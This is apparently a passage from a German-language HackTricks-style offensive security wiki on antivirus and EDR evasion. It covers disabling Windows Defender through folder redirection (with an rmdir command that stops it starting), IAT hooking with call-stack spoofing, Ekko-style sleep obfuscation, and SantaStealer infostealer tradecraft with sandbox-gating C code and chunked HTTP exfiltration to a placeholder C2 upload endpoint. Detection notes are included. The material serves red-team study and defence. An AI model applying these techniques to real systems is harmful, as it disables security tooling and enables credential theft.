4) Überprüfen Sie, dass MsMpEng.exe (WinDefend) vom umgeleiteten Pfad ausgeführt wird:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
Sie sollten den neuen Prozesspfad unter `C:\TMP\AV\` und die Service-Konfiguration/Registry sehen, die diesen Speicherort widerspiegelt.

Post-exploitation options
- DLL sideloading/code execution: Drop/replace DLLs, die Defender aus seinem Anwendungsverzeichnis lädt, um Code in Defenders Prozessen auszuführen. Siehe den Abschnitt oben: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Service kill/denial: Remove the version-symlink, sodass beim nächsten Start der konfigurierte Pfad nicht aufgelöst wird und Defender nicht startet:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```
> [!TIP]
> Beachten Sie, dass diese Technik für sich genommen keine Privilegieneskalation bietet; sie erfordert Administratorrechte.

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

Red Teams können Runtime-Evasion aus dem C2-Implantat in das Zielmodul selbst verlagern, indem sie dessen Import Address Table (IAT) hooken und ausgewählte APIs durch attacker-controlled, position‑independent code (PIC) leiten. Das verallgemeinert Evasion über die kleine API-Oberfläche hinaus, die viele Kits exponieren (z. B. CreateProcessA), und erweitert denselben Schutz auf BOFs und post‑exploitation DLLs.

## Vorgehensweise (auf hoher Ebene)
- Stage a PIC blob alongside the target module using a reflective loader (prepended or companion). The PIC must be self‑contained and position‑independent.
- Während die Host-DLL geladen wird, durchlaufen Sie deren IMAGE_IMPORT_DESCRIPTOR und patchen die IAT-Einträge für die anvisierten Imports (z. B. CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc), sodass sie auf schlanke PIC-Wrapper zeigen.
- Jeder PIC-Wrapper führt Evasions aus, bevor er einen tail‑call auf die echte API-Adresse macht. Typische Evasions umfassen:
  - Memory mask/unmask around the call (z. B. encrypt beacon regions, RWX→RX, change page names/permissions) und nach dem Aufruf wiederherstellen.
  - Call‑stack spoofing: einen benignen Stack konstruieren und in die Ziel-API übergehen, sodass Call‑stack-Analysen auf erwartete Frames auflösen.
- Zur Kompatibilität ein Interface exportieren, damit ein Aggressor-Skript (oder Äquivalent) registrieren kann, welche APIs für Beacon, BOFs und post‑ex DLLs gehookt werden sollen.

## Warum IAT hooking hier
- Funktioniert für jeden Code, der den gehookten Import verwendet, ohne Tool-Code zu modifizieren oder darauf zu vertrauen, dass Beacon bestimmte APIs proxyt.
- Deckt post‑ex DLLs ab: Hooking von LoadLibrary* erlaubt es, Modul-Ladevorgänge (z. B. System.Management.Automation.dll, clr.dll) zu intercepten und dieselbe Maskierungs-/Stack‑Evasion auf deren API-Aufrufe anzuwenden.
- Stellt die zuverlässige Ausführung von prozessstartenden post‑ex Befehlen gegen call‑stack–basierte Erkennungen wieder her, indem CreateProcessA/W umwickelt wird.

Minimal IAT hook sketch (x64 C/C++ pseudocode)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Hinweise
- Apply the patch nach relocations/ASLR und vor der ersten Verwendung des import. Reflective loaders wie TitanLdr/AceLdr zeigen Hooking während DllMain des geladenen Moduls.
- Halte Wrapper klein und PIC-safe; löse die echte API über den ursprünglichen IAT-Wert, den du vor dem Patchen erfasst hast, oder via LdrGetProcedureAddress.
- Verwende RW → RX‑Übergänge für PIC und vermeide es, Seiten beschreibbar+ausführbar zu belassen.

Call‑stack spoofing stub
- Draugr‑style PIC stubs bauen eine gefälschte Call‑Chain (Return‑Adressen in benignen Modulen) und pivoten dann in die echte API.
- Das schlägt Detektionen, die kanonische Stacks von Beacon/BOFs zu sensitiven APIs erwarten.
- Kombiniere mit stack cutting/stack stitching Techniken, um vor der API‑Prolog in erwarteten Frames zu landen.

Betriebliche Integration
- Füge den reflective loader an post‑ex DLLs an, sodass PIC und Hooks automatisch initialisiert werden, wenn die DLL geladen wird.
- Nutze ein Aggressor‑Script, um Ziel‑APIs zu registrieren, sodass Beacon und BOFs transparent vom gleichen Evasion‑Pfad profitieren, ohne Codeänderungen.

Detection/DFIR‑Überlegungen
- IAT integrity: Einträge, die auf non‑image (heap/anon) Adressen auflösen; periodische Verifikation von Import‑Pointers.
- Stack‑Anomalien: Return‑Adressen, die nicht zu geladenen Images gehören; abrupte Übergänge zu non‑image PIC; inkonsistente RtlUserThreadStart‑Abstammung.
- Loader‑Telemetrie: In‑process Writes an die IAT, frühe DllMain‑Aktivität, die Import‑Thunks modifiziert, unerwartete RX‑Regionen, die beim Laden erstellt werden.
- Image‑load evasion: Beim Hooking von LoadLibrary*, überwache verdächtige Loads von automation/clr assemblies, korreliert mit memory masking‑Ereignissen.

Verwandte Bausteine und Beispiele
- Reflective loaders, die IAT‑Patching während des Loads durchführen (z. B. TitanLdr, AceLdr)
- Memory masking hooks (z. B. simplehook) und stack‑cutting PIC (stackcutting)
- PIC call‑stack spoofing stubs (z. B. Draugr)


## Import-Time IAT Hooking + Sleep Obfuscation (Crystal Palace/PICO)

### Import-time IAT hooks via a resident PICO

Wenn du die Kontrolle über einen reflective loader hast, kannst du Imports **während** `ProcessImports()` hooken, indem du den `GetProcAddress`‑Pointer des Loaders durch einen custom resolver ersetzt, der zuerst Hooks prüft:

- Baue ein **resident PICO** (persistentes PIC‑Objekt), das weiterlebt, nachdem das transient loader PIC sich freigegeben hat.
- Exportiere eine `setup_hooks()` Funktion, die den Import‑Resolver des Loaders überschreibt (z. B. `funcs.GetProcAddress = _GetProcAddress`).
- In `_GetProcAddress` überspringe Ordinal‑Imports und verwende eine hash‑basierte Hook‑Suche wie `__resolve_hook(ror13hash(name))`. Wenn ein Hook existiert, returne ihn; ansonsten delegiere an das echte `GetProcAddress`.
- Registriere Hook‑Ziele zur Link‑Zeit mit Crystal Palace `addhook "MODULE$Func" "hook"` Einträgen. Der Hook bleibt gültig, weil er im resident PICO lebt.

Das ergibt eine **import‑time IAT‑Umleitung** ohne das nachträgliche Patchen der Code‑Section der geladenen DLL.

### Forcing hookable imports when the target uses PEB-walking

Import‑time Hooks werden nur ausgelöst, wenn die Funktion tatsächlich im IAT des Ziels vorhanden ist. Wenn ein Modul APIs über einen PEB‑walk + hash auflöst (keinen Import‑Eintrag), erzwinge einen echten Import, damit der `ProcessImports()`‑Pfad des Loaders ihn sieht:

- Ersetze hashed export resolution (z. B. `GetSymbolAddress(..., HASH_FUNC_WAIT_FOR_SINGLE_OBJECT)`) durch eine direkte Referenz wie `&WaitForSingleObject`.
- Der Compiler emittiert einen IAT‑Eintrag, wodurch Abfangen möglich wird, wenn der reflective loader Imports auflöst.

### Ekko-style sleep/idle obfuscation without patching `Sleep()`

Anstatt `Sleep` zu patchen, hooke die **tatsächlichen Wait/IPC‑Primitiven**, die das Implant verwendet (`WaitForSingleObject(Ex)`, `WaitForMultipleObjects`, `ConnectNamedPipe`). Für lange Wartezeiten wrappe den Aufruf in eine Ekko‑artige Obfuskationskette, die das in‑Memory Image während der Idle‑Phase verschlüsselt:

- Verwende `CreateTimerQueueTimer`, um eine Sequenz von Callbacks zu planen, die `NtContinue` mit crafted `CONTEXT`‑Frames aufrufen.
- Typische Kette (x64): setze das Image auf `PAGE_READWRITE` → RC4 encrypt via `advapi32!SystemFunction032` über das komplette gemappte Image → führe den blockierenden Wait aus → RC4 decrypt → **stelle die permissions pro Section wieder her** durch Traversieren der PE‑Sections → signalisiere Abschluss.
- `RtlCaptureContext` liefert eine Template‑`CONTEXT`; kloniere sie in mehrere Frames und setze Register (`Rip/Rcx/Rdx/R8/R9`), um jeden Schritt aufzurufen.

Betriebliche Details: gib für lange Wartezeiten „Erfolg“ zurück (z. B. `WAIT_OBJECT_0`), sodass der Caller weiterläuft, während das Image maskiert ist. Dieses Muster versteckt das Modul während Idle‑Fenstern vor Scannern und vermeidet die klassische „patched `Sleep()`“‑Signatur.

Erkennungsideen (telemetrie‑basiert)
- Bursts von `CreateTimerQueueTimer` Callbacks, die auf `NtContinue` zeigen.
- `advapi32!SystemFunction032` Verwendung auf großen, zusammenhängenden, image‑großen Buffern.
- VirtualProtect über große Bereiche gefolgt von custom per‑section Permission‑Wiederherstellung.

## SantaStealer Tradecraft for Fileless Evasion and Credential Theft

SantaStealer (aka BluelineStealer) zeigt, wie moderne info‑stealer AV‑Bypass, Anti‑Analysis und Credential‑Access in einem Workflow kombinieren.

### Keyboard layout gating & sandbox delay

- Ein Config‑Flag (`anti_cis`) enumeriert installierte Keyboard‑Layouts via `GetKeyboardLayoutList`. Wird ein kyrillisches Layout gefunden, legt das Sample einen leeren `CIS`‑Marker ab und beendet sich, bevor die Stealer ausgeführt werden, sodass es niemals auf ausgeschlossenen Locales detoniert, aber ein hunting artifact hinterlässt.
```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
if (lang == LANG_RUSSIAN) {
CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
ExitProcess(0);
}
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```
### Mehrschichtige `check_antivm`-Logik

- Variante A durchläuft die Prozessliste, hasht jeden Namen mit einer benutzerdefinierten rollenden Prüfsumme und vergleicht ihn mit eingebetteten Blocklisten für Debugger/Sandboxen; sie wiederholt die Prüfsumme für den Computernamen und prüft Arbeitsverzeichnisse wie `C:\analysis`.
- Variante B untersucht Systemeigenschaften (Mindestanzahl Prozesse, kürzliche Uptime), ruft `OpenServiceA("VBoxGuest")` auf, um VirtualBox‑Additions zu erkennen, und führt Timing‑Checks um Sleeps herum durch, um Single‑Stepping zu entdecken. Jeder Treffer bricht vor dem Start der Module ab.

### Fileless helper + double ChaCha20 reflective loading

- Die primäre DLL/EXE bettet einen Chromium credential helper ein, der entweder auf die Festplatte geschrieben oder manuell in den Speicher gemappt wird; im fileless‑Modus löst er Imports/Relocations selbst auf, sodass keine Helper‑Artefakte geschrieben werden.
- Dieser Helper speichert eine zweite Stage‑DLL, die zweimal mit ChaCha20 verschlüsselt ist (zwei 32‑Byte‑Keys + 12‑Byte‑Nonces). Nach beiden Durchläufen lädt er das Blob reflectiv (kein `LoadLibrary`) und ruft die Exports `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup` auf, abgeleitet von [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption).
- Die ChromElevator‑Routinen nutzen direct‑syscall reflective process hollowing, um in einen laufenden Chromium‑Browser zu injizieren, AppBound Encryption‑Keys zu erben und Passwörter/Cookies/Kreditkartendaten direkt aus SQLite‑Datenbanken zu entschlüsseln, trotz ABE‑Härtung.


### Modulare in-memory-Erfassung & gestückelte HTTP-Exfil

- `create_memory_based_log` iteriert eine globale `memory_generators`-Funktionszeigertabelle und startet pro aktiviertem Modul einen Thread (Telegram, Discord, Steam, screenshots, documents, browser extensions, etc.). Jeder Thread schreibt Ergebnisse in gemeinsame Puffer und meldet seine Dateianzahl nach einem ~45s join window.
- Nach Abschluss wird alles mit der statisch gelinkten `miniz`-Library als `%TEMP%\\Log.zip` gezippt. `ThreadPayload1` schläft dann 15s und streamt das Archiv in 10 MB‑Chunks via HTTP POST an `http://<C2>:6767/upload`, wobei eine Browser `multipart/form-data` Boundary (`----WebKitFormBoundary***`) gefälscht wird. Jeder Chunk fügt `User-Agent: upload`, `auth: <build_id>`, optional `w: <campaign_tag>` hinzu, und der letzte Chunk hängt `complete: true` an, damit der C2 die Reassemblierung als abgeschlossen erkennt.

## References

- [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [Elastic – Call stacks, no more free passes for malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [Crystal Palace – docs](https://tradecraftgarden.org/docs.html)
- [simplehook – sample](https://tradecraftgarden.org/simplehook.html)
- [stackcutting – sample](https://tradecraftgarden.org/stackcutting.html)
- [Draugr – call-stack spoofing PIC](https://github.com/NtDallas/Draugr)
- [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [Hexacorn – DLL ForwardSideLoading: Abusing Forwarded Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [Microsoft Docs – Known DLLs](https://learn.microsoft.com/windows/win32/dlls/known-dlls)
- [Microsoft – Protected Processes](https://learn.microsoft.com/windows/win32/procthread/protected-processes)
- [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [Zero Salarium – Break The Protective Shell Of Windows Defender With The Folder Redirect Technique](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [Microsoft – mklink command reference](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [Rapid7 – SantaStealer is Coming to Town: A New, Ambitious Infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [ChromElevator – Chrome App Bound Encryption Decryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [Check Point Research – GachiLoader: Defeating Node.js Malware with API Tracing](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [Sleeping Beauty: Putting Adaptix to Bed with Crystal Palace](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty/)
- [Ekko sleep obfuscation](https://github.com/Cracked5pider/Ekko)
- [SysWhispers4 – GitHub](https://github.com/JoasASantos/SysWhispers4)


{{#include ../banners/hacktricks-training.md}}
